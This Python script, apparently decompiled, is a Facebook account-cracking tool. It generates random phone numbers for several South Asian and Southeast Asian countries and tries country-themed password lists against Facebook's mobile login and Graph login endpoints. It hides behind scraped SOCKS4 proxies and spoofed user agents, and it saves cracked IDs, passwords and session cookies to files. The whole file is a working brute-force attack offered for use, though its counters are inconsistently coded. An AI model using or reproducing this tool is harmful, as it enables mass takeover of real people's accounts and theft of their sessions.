import requests
import bs4 
import json
import uuid
import os
import sys
import random
import datetime 
import time
import re
import urllib3 
import base64
import string
import platform 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime 
id = []
user = []
poco = [] 
memek = []
loop = 0
ok = 0
cp = 0

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    with open('Proksi.txt', 'w') as f:
        f.write(prox)
except Exception as e:
    print(e)

# Line 16: ANSI escape codes for colors
G = '\x1b[1;32m'  # Green
W = '\x1b[1;97m'  # White
R = '\x1b[38;5;160m' # Red
B = '\x1b[1;90m'  # Bright Black (Gray)
Y = '\x1b[1;33m'  # Yellow
T = '\x1b[1;34m'  # Blue
E = '\x1b[38;5;205m' # Pink/Magenta like
O = '\x1b[38;5;81m'  # Cyan like

# Line 18: Formatted strings for UI elements
# BUILD_STRING and STORE_NAME
xd = f" {T}[{G}Π{T}]{G}"
xd1 = f" {R}[{G}1{R}]{G}"
xd2 = f" {R}[{G}2{R}]{G}"
xd3 = f" {R}[{G}3{R}]{G}"
xd4 = f" {R}[{G}4{R}]{G}"
xd5 = f" {R}[{G}5{R}]{G}"
xd6 = f" {R}[{G}6{R}]{G}"
xd0 = f" {R}[{G}0{R}]{G}"
xdx = f" {R}[{G}?{R}]{G}"


def clear():

    os.system('clear')

    print(logo)

def linex():
    print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

logo = (
    f"{O}\n   _|_|_|  _|_|_|    _|_|    _|      _|  \n"
    f" _|          _|    _|    _|  _|_|  _|_|  \n"
    f"   _|_|      _|    _|_|_|_|  _|  _|  _|  \n"
    f"       _|    _|    _|    _|  _|      _|  \n"
    f" _|_|_|    _|_|_|  _|    _|  _|      _|\n"
    f"{W}\n" 
    f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}\n" # Line 29 (W is redundant here if already applied)
    f"{xd} DEVELOPER {R}:{Y} SIAM\n"
    f"{xd} TOOLS     {R}:{R} RANDOM {G} CLONE\n"
    f"{xd} VERSION  {R} : {T} 15.0X\n" 
    f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" # Line 33
)

def SIAM():
    global poco
    clear()
    print(f"{xd1} BANGLADESH RANDOM CLONING ")
    print(f"{xd2} INDIA RANDOM CLONING  ")
    print(f"{xd3} PAKISTAN RANDOM CLONING  ")
    print(f"{xd4} NEPAL RANDOM CLONING  ")
    print(f"{xd5} AFGHANISTAN RANDOM CLONING  ")
    print(f"{xd6} MALAYSIA RANDOM CLONING  ")
    print(f"{xd0} EXIT TOOLS ")
    linex()
    ___option___ = input(f"{xdx} SELECTION {R}:{G} ")

    if ___option___ == '1': 
        os.system('xdg-open https://t.me/vixfbclone') 
        poco.append('1')
        ______randomxmenu_______()
    elif ___option___ == '2':
        os.system('xdg-open https://t.me/vixfbclone')
        poco.append('2')
        ______randomxmenu_______()
    elif ___option___ == '3':
        os.system('xdg-open https://t.me/vixfbclone')
        poco.append('3')
        ______randomxmenu_______()
    elif ___option___ == '4':
        os.system('xdg-open https://t.me/vixfbclone')
        poco.append('4')
        ______randomxmenu_______()
    elif ___option___ == '5':
        os.system('xdg-open https://t.me/vixfbclone')
        poco.append('5')
        ______randomxmenu_______()
    elif ___option___ == '6':
        os.system('xdg-open https://t.me/vixfbclone')
        poco.append('6')
        ______randomxmenu_______()
    elif ___option___ == '0':
        exit()
    else:
        linex()
        print(f"{xd} OPTION NOT FOUND ")
        linex()
        time.sleep(1)
        print(f"{xd} TRY AGAIN ")
        time.sleep(1)
        SIAM()
        
        
def ______randomxmenu_______():
    global loop, ok, cp, user
    clear()

    if '1' in poco: # Bangladesh
        print(f"{xd} EXAMPLE {R}:{G} 013 {R}|{G} 016 {R}|{G} 017 {R}|{G} 018 {R}|{G} 019 ")
        linex()
    elif '2' in poco: # India
        print(f"{xd} EXAMPLE {R}:{G} +91639 {R}|{G} +91600 {R}|{G} +91620 ")
        linex()
    elif '3' in poco: # Pakistan
        print(f"{xd} EXAMPLE {R}:{G} 0306 {R}|{G} 0315 {R}|{G} 0335 {R}|{G} 0345 ")
        linex()
    elif '4' in poco: # Nepal
        print(f"{xd} EXAMPLE {R}:{G} 9814 {R}|{G} 9815 {R}|{G} 9861 {R}|{G} 9840 ")
        linex()
    elif '5' in poco: # Afghanistan
        print(f"{xd} EXAMPLE {R}:{G} +9340 {R}|{G} +9360 {R}|{G} +9330 {R}|{G} +9350 ")
        linex()
    elif '6' in poco: # Malaysia
        print(f"{xd} EXAMPLE {R}:{G} 0113 {R}|{G} 0116 {R}|{G} 0112 {R}|{G} 0119 ")
        linex()

    code = input(f"{xdx} ENTER SIM CODE {R}:{G} ")
    linex()
    print(f"{xd} EXAMPLE {R}:{G} 6969 {R}|{G} 5555 {R}|{G} 7777 {R}|{G} 99999 ")
    linex()
    limit = int(input(f"{xdx} ENTER CRACK LIMIT {R}:{G} "))
    clear()
    print(f"{xd1} METHOD M1 {R}|{G}HOST{R}| ")
    print(f"{xd2} METHOD M2 {R}|{G}GRAPH{R}| ")
    linex()
    ___method___ = input(f"{xdx} ENTER METHOD {R}:{G} ")

    user = [] 
    for _ in range(limit): 
        if '1' in poco: 
            gang = "".join(random.choice(string.digits) for _ in range(8))
            user.append(gang)
        elif '2' in poco:
            gang = "".join(random.choice(string.digits) for _ in range(6))
            user.append(gang)
        elif '3' in poco: 
            gang = "".join(random.choice(string.digits) for _ in range(7))
            user.append(gang)
        elif '4' in poco: 
            gang = "".join(random.choice(string.digits) for _ in range(6)) # Original bytecode uses 6, not 8
            user.append(gang)
        elif '5' in poco: # Afghanistan (7 digits random)
            gang = "".join(random.choice(string.digits) for _ in range(7))
            user.append(gang)
        elif '6' in poco: # Malaysia (7 digits random)
            gang = "".join(random.choice(string.digits) for _ in range(7))
            user.append(gang)

    clear()
    tl = str(len(user))
    print(f"{xd} CODE{R}|{G}UID {R}:{T} {code}{R}|{E}{tl} ")
    print(f"{xd} IF NO RESULT ON{R}|{G}OFF AIRPLANE MODE")
    print(f"{xd} YOUR CLONING STARTED........{R}π")
    print(f"{xd} {G}USE VPN {R}: {T}1.1.1.1")
    linex()


    with ThreadPool(max_workers=60) as ____poco____:
        for love in user:
            ids = code + love
            pasx = [] # Password list

            if '1' in poco: # BD
                pasx = [ids, love, ids[None:6], ids[None:7], ids[None:8], ids[5:None]]
            elif '2' in poco: # IND
                pasx = [ids, love, ids[None:6], '57273200', '57575751', '59039200']
            elif '3' in poco: # PAK
                pasx = [
                    ids, love, ids[5:None], 'khankhan', 'khan1122', 'ali12345',
                    'khanbaba', 'pakistan', 'khan12345', 'ali1122',
                    'khankhan12345', 'khan', 'baloch', 'pubg', 'pubg1122'
                ]
            elif '4' in poco: # NEP
                pasx = [
                    ids, love, ids[None:8], ids[None:7], ids[None:6],
                    'nepal12', 'nepal123', 'nepal1234', 'nepal12345', 'maya123',
                    'kathmandu', 'pokhara', 'tamang', 'maya1234', 'tamang123',
                    'tamang12345', 'nepal@123', 'kathmandu123'
                ]
            elif '5' in poco: # AFG
                pasx = [
                    love, ids, 'afghan', 'afghan12345', 'afghan123', '600700',
                    'afghanistan', 'afghan1122', '500500', '100200', '10002000',
                    '900900', 'kabul123', 'Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹', 'Û±Û³Û³Û³ÛµÛ¶', # These are likely garbled unicode for 123456789 and 123456
                    'afghan1234', 'kabul1234', 'khankhan', 'khan123',
                    'khan123456', 'khan786'
                ]
            elif '6' in poco: 
                pasx = [ids, love, love[1:None], ids[None:7], ids[None:6], ids[None:8]]


            if '1' in ___method___: 
                ____poco____.submit(____methodA____, ids, pasx, tl) 
            elif '2' in ___method___:
                ____poco____.submit(____methodB____, ids, pasx, tl)



    print('\x1b[1;37m') 
    linex()
    print(f"{xd} THE PROCESS HAS COMPLETED")
    print(f"{xd} TOTAL OK{R}|{G}CP {R}:{G} {str(len(ok))}{R}|{G}{str(len(cp))}") # Assumes ok and cp are lists where len() is meaningful
    linex()
    exit()


# Line 78: Definition of ____PO_CO____() function (User-Agent Generator)
# MAKE_FUNCTION, STORE_NAME
def ____PO_CO____():
    version_choices = ['14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1']
    model_choices = ['SM-T835', 'SM-S901U', 'SM-S134DL', 'SM-J250F', 'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 'SM-J410G', 'SM-A205GN', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005', 'SM-J210F']
    build_choices = ['MMB29Q', 'R16NW', 'LRX22C', 'R16NW', 'KTU84P', 'JLS36C', 'NJH47F', 'PPR1.180610.011', 'QP1A.190711.020', 'NRD90M', 'RP1A.200720.012', 'M1AJB', 'MMB29T']

    version = random.choice(version_choices)
    model = random.choice(model_choices)
    build = random.choice(build_choices)
    ver = str(random.choice(range(77, 577))) # Corrected range
    ver2 = str(random.choice(range(57, 77))) # Corrected range

    return (f'Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) '
            f'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36')

# Line 86: Definition of ____methodA____ (Facebook login attempt - touch.facebook.com)
# MAKE_FUNCTION, STORE_NAME
def ____methodA____(ids, pasx, tl_unused): # tl is passed but not used meaningfully inside
    global loop, ok, cp # To modify global counters/lists
    sys.stdout.write(f'\r\r{G}<[SIAM]> <[M-1]> {loop} | OK|CP {ok} | {cp}{G}') # Assuming ok, cp are integers
    sys.stdout.flush()

    ewe = requests.Session()
    ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'

    for pw in pasx:
        try:
            with open('Proksi.txt', 'r') as f:
                proxies_list = f.read().splitlines()
            current_proxy = random.choice(proxies_list)
            zz = {'http': 'socks4://' + current_proxy, 'https': 'socks4://' + current_proxy} # Assuming SOCKS4

            link = ewe.get('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text

            data = {
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(link)).group(1),
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': ids,
                'prefill_contact_point': ids,
                'prefill_source': 'browser_dropdown',
                'prefill_type': 'contact_point',
                'first_prefill_source': 'browser_dropdown',
                'first_prefill_type': 'contact_point',
                'had_cp_prefilled': True,
                'had_password_prefilled': False,
                'is_smart_lock': False,
                'bi_xrwh': '0',
                'encpass': f'#PWD_BROWSER:0:{str(time.time()).split(".")[0]}:{pw}',
                'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                'jazoest': re.search('name="jazoest" value="(\\d+)"', str(link)).group(1),
                'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
            }

            headers = {
                'Host': 'touch.facebook.com',
                # 'content-length': str(len(str(data))), # Content-length is usually set by requests
                'sec-ch-ua': f'"Not_A Brand";v="8", "Chromium";v="{re.search("Chrome/(\\d+).", str(ua)).group(1)}", "Google Chrome";v="{re.search("Chrome/(\\d+).", str(ua)).group(1)}"',
                'sec-ch-ua-mobile': '?1',
                'user-agent': ____PO_CO____(), # Using the dynamic UA generator
                'x-response-format': 'JSONStream',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
                'viewport-width': '360',
                'x-requested-with': 'XMLHttpRequest',
                'x-asbd-id': '129477',
                'dpr': '2',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua-platform': '"Android"',
                'accept': '*/*',
                'origin': 'https://touch.facebook.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
                'sec-fetch-dest': 'empty',
                'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            }
            response_cookies = ewe.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',
                                 data=data, headers=headers, allow_redirects=False, proxies=zz).cookies.get_dict()

            if 'checkpoint' in response_cookies:
                uid = response_cookies.get('checkpoint', '').split('3A')[1].split('%')[0]
                print(f'\r{xd}-{R}[{Y}SIAM-CP{R}]{Y} {uid} | {pw} ')
                with open('/sdcard/SIAM-M1-RANDOM-CP.txt', 'a') as f:
                    f.write(f'{uid}|{pw}\n')
                cp += 1
            elif 'c_user' in response_cookies:
                kuki = ";".join([f"{key}={value}" for key, value in response_cookies.items()])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r{xd}-{R}[{G}SIAM-OK{R}]{G} {uid} | {pw} ')
                print(f'\r{R}[💥{R}]{G} {kuki} ') # Cookie print
                print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                with open('/sdcard/SIAM-M1-RANDOM-OK.txt', 'a') as f:
                    f.write(f'{uid}|{pw}|{kuki}\n')
                ok += 1

        except requests.exceptions.ConnectionError:
            time.sleep(15) 
        except Exception: 
            pass
    loop += 1


def ____methodB____(ids, pasx, tl_unused): # tl is passed but not used meaningfully inside
    global loop, ok, cp 
    sys.stdout.write(f'\r\r{G}<[SIAM]> <[M-2]> {loop} | OK|CP {len(ok)} | {len(cp)}{G}')
    sys.stdout.flush()

    for pw in pasx:
        try:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32' # Fixed access token
            random_seed = random.Random() # Create a new Random instance
            adid = "".join(random_seed.choices(string.hexdigits, k=16)) # Generate adid

            ua_graph = (f'[FBAN/FB4A;FBAV/{str(random.randint(11, 99))}.0.0.{str(random.randint(1111, 9999))};FBBV/{str(random.randint(1111111, 9999999))};'
                        '[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]')

            data = {
                'adid': adid,
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': ids,
                'password': pw,
                'access_token': accessToken,
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': '8b59ed89-4b88-4f69-a1ed-dfea59e76839', # Fixed advertiser_id from bytecode
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login', # Corrected: was 'auth.login': 'authenticate'
                'fb_api_req_friendly_name': 'authenticate', # from bytecode structure
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', # from bytecode structure
                'api_key': '882a8490361da98702bf97a021ddc14d' # from bytecode
            }
            headers = {
                'User-Agent': ua_graph,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '45204',  # Example value from bytecode
                'X-FB-SIM-HNI': '45201',  # Example value
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation', # Although data suggests 'authenticate'
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                # 'Content-Length': '698' # Usually set by requests
            }
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()

            if 'session_key' in po:
                uid = str(po['uid'])
                coki = ";".join([f"{i['name']}={i['value']}" for i in po['session_cookies']])
                # response_live_check = str(requests.get(f'https://mrpoco143.pythonanywhere.com/live?uid={uid}').text)
                # if 'LIVE' in response_live_check:
                print(f'\r{xd}-{R}[{G}SIAM-OK{R}]{G} {uid} | {pw} ')
                # print(f'\r {R}[{T}COOKIES-🌹{G}]{G} {coki} ') # 'kuki' undefined here, should be 'coki'
                print(f'\r {R}[{T}COOKIES-🌹{G}]{G} {coki} ')
                print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                with open('/sdcard/SIAM-M2-RANDOM-OK.txt', 'a') as f:
                    f.write(f'{uid}|{pw}|{coki}\n')
                ok.append(str(uid))
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''): # Check for CP
                uid = po.get('error', {}).get('error_data', {}).get('uid', ids) # Get UID from error if possible
                print(f'\r{xd}-{R}[{Y}SIAM-CP{R}]{Y} {uid} | {pw} ')
                with open('/sdcard/SIAM-M2-RANDOM-CP.txt', 'a') as f:
                    f.write(f'{uid}|{pw}\n')
                cp.append(str(uid)) 
        except Exception as e:
            
            pass 
    loop += 1

if __name__ == '__main__':
    SIAM()
